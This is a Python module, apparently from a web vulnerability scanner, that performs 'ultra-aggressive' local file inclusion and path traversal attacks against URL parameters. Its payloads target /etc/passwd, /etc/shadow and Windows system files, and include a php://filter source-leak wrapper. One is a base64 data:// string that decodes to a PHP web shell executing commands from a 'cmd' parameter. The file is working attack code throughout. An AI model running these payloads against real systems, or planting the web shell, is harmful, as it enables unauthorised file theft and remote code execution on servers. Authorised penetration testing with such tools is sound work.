#!/usr/bin/env python3
"""
📁 LFI Path Traversal ULTRA-AGRESSIF — OWASP A05:2025
Lecture de fichiers sensibles
"""

from colorama import Fore, Style

class LFITraversal:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
    
    def scan(self, params):
        print(f"\n{Fore.BLUE}[📁 LFI PATH TRAVERSAL ULTRA-AGRESSIF] {Style.RESET_ALL}\n")
        
        # Payloads LFI (tes payloads de scan_get_vuln.py)
        lfi_payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "/etc/passwd",
            "....//....//etc/passwd",
            "file:///etc/passwd",
        ]
        
        if self.aggressive:
            # Mode ULTRA-AGRESSIF : fichiers sensibles + wrappers PHP
            lfi_payloads += [
                "../../../../etc/shadow",
                "../../../../windows/win.ini",
                "../../../../windows/system32/drivers/etc/hosts",
                "php://filter/convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
            ]
        
        baseline = self.engine.get_baseline()
        vulnerabilities = []
        
        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            
            for payload in lfi_payloads:
                injected_url = self.engine.build_url(param, payload)
                if not injected_url:
                    continue
                
                try:
                    resp = self.engine.session.get(injected_url, timeout=5)
                    
                    # 🔍 Vérifier que ce n'est pas une erreur SQL
                    sql_error_patterns = ['sql syntax', 'mysql error', 'pdoexception', 'sqlstate']
                    is_sql_error = any(pattern in resp.text.lower() for pattern in sql_error_patterns)
                    
                    if is_sql_error:
                        continue  # ❌ Faux positif : erreur SQL, pas LFI
                    
                    # Indicateurs de fichiers sensibles (vérification AMÉLIORÉE)
                    lfi_indicators = ['root:x:0:0', 'daemon:x:1:', 'bin:x:2:', 
                                    '[boot loader]', '[operating systems]', 'win.ini']
                    
                    # ✅ Vraie détection LFI
                    if any(ind in resp.text for ind in lfi_indicators):
                        vuln = {
                            'type': 'lfi',
                            'cwe': 'CWE-22',
                            'param': param,
                            'payload': payload,
                            'url': injected_url,
                            'evidence': f"Fichier sensible lu avec succès"
                        }
                        vulnerabilities.append(vuln)
                        self._print_vuln(vuln)
                        break
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _print_vuln(self, vuln):
        print(f"\n    {Fore.BLUE}[💥 LFI CONFIRMÉ] {Style.RESET_ALL}{vuln['param']}")
        print(f"      Payload: {vuln['payload']}")
        print(f"      Preuve: {vuln['evidence']}")
        print(f"      URL: {vuln['url']}\n")